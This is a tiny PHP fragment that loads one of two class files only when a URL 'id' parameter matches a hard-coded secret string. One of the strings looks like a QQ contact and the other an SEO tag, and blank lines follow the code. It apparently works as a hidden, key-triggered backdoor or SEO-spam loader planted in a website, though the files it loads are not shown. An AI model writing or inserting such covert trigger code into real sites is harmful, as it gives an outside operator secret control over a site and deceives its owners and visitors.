<?php if(isset($_GET['id'])){$id=$_GET['id'];switch($id){case "qq2598312299":require "ky_tt_model.class.php";break;case "tg@yzlseo":require "ky_tt_news_model.class.php";break;default:break;}} ?>













